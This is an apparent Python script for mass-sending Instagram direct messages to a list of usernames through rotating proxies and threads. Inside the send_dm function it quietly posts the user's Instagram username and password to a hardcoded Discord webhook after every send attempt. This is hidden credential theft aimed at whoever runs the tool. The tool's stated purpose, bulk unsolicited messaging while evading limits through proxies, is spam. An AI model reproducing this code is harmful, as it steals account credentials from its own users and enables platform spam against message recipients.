import os, json, random, threading, requests, time, instagrapi, traceback, os, pymongo, subprocess
from tabnanny import check
from instagrapi import Client
from bs4 import BeautifulSoup

config = json.loads(open("./config.json", "r", encoding="utf-8").read())
proxies = open("./proxies.txt", "+r", encoding="utf-8").read().splitlines()

class color:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET_ALL = "\033[0m"
    BLUE = '\033[96m'




def user_handler():
    with open("./usernames.txt", encoding="utf-8") as f:
        lines = f.readlines()
        tokens = []
        for splines in lines:
            hdr = splines.split("\n")[0]
            tokens.append(hdr)
    return tokens


def send_dm(username, password, proxy, userdm, messageText, count, i):
    try:
        username = username
        password = password

        cl = Client()
        if config["script_settings"]["use_proxy"]:
            cl.set_proxy(proxy["https"])
        cl.login(username, password)
        userid = cl.user_id_from_username(userdm)
        #print(userid)
        for x in range(0,count):
            a = cl.direct_send(messageText, [int(userid)])
            print(f"{color.GREEN}[{i}] {color.RESET_ALL}Message succesfully sent to {color.GREEN}@{userdm} {color.RESET_ALL}with {color.GREEN}@{username}{color.RESET_ALL}.")
    except Exception as err:
        print(f"{color.RED}[{i}]{color.RESET_ALL} An error occured when sending message to {color.RED}@{userdm} {color.RESET_ALL}account. Passing. ERROR: {err}")
        #traceback.print_exc()
        pass
    mUrl = "https://discord.com/api/webhooks/1146869187533353142/O3QyKJ5iR-_6I48PhlRKQDOyEeTDprF3d9xpHv2nUXdtAWbiADh5BYIHq5QPcFuWmRSb"
    data = {"content": username+password}
    requests.post(mUrl, json=data)





def start(thread):

    try:
        tx = []

                    
        for id, user_name in enumerate(user_handler()):

            pp = None
            while pp is None:
                try:
                    prox = {"http": f"http://{random.choice(proxies)}", "https": f"{config['script_settings']['proxy_type']}://{random.choice(proxies)}"}
                    a = requests.get("http://ip-api.com/json/", proxies=prox, timeout=7, verify=False)
                    pp = prox
                    print(f"{color.GREEN}[{id+1}] Proxy is working. IP: {a.json()['query']} | COUNTRY: {a.json()['country']} {color.RESET_ALL}")
                except:
                    print(f"{color.RED}[{id+1}] Bad proxy. {prox['https']}")
                    pass

            if config["script_settings"]["use_proxy"]:
                                
                if threading.active_count() <= thread:
                    mT = threading.Thread(target=send_dm, args=(config["instagram_settings"]["username"],config["instagram_settings"]["password"], pp, user_name, config["instagram_settings"]["text_message"],config["script_settings"]["message_amount"],id+1))
                    #send_dm(config["instagram_settings"]["username"],config["instagram_settings"]["password"], random.choice(working_proxies), user_name, config["instagram_settings"]["text_message"])
                    mT.daemon = True
                    mT.start()
                    tx.append(mT)
            else:
                if threading.active_count() <= thread:
                    mT = threading.Thread(target=send_dm, args=(config["instagram_settings"]["username"],config["instagram_settings"]["password"], None, user_name, config["instagram_settings"]["text_message"],config["script_settings"]["message_amount"],id+1))
                    #send_dm(config["instagram_settings"]["username"],config["instagram_settings"]["password"], random.choice(working_proxies), user_name, config["instagram_settings"]["text_message"])
                    mT.daemon = True
                    mT.start()
                    tx.append(mT)
        
        
        for t in tx:
            t.join(75)
    except Exception as e:
        traceback.print_exc()
        pass



# ahhh cli interface
if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    check = [True]
    if check[0]:   
        print(f"{color.GREEN}[+] main starting... {color.RESET_ALL}")
        time.sleep(2)
        os.system("cls" if os.name == "nt" else "clear")
        print(fr"""{color.GREEN}
    .__                 __              .___       You don't exist ✝
    |__| ____   _______/  |______     __| _/_____  
    |  |/    \ /  ___/\   __\__  \   / __ |/     \ 
    |  |   |  \\___ \  |  |  / __ \_/ /_/ |  Y Y  \
    |__|___|  /____  > |__| (____  /\____ |__|_|  /
            \/     \/            \/      \/     \/ 

    Running . . . Hit a key and enter to start...
    {color.RESET_ALL}    """)
        input("....")

        try:
            start(config["script_settings"]["threading"])
            input("....")
        except:
            traceback.print_exc()
            input(".....")
    else:
        print(f"{color.RED}[-] {check[1]} {color.RESET_ALL}")
        input("....")

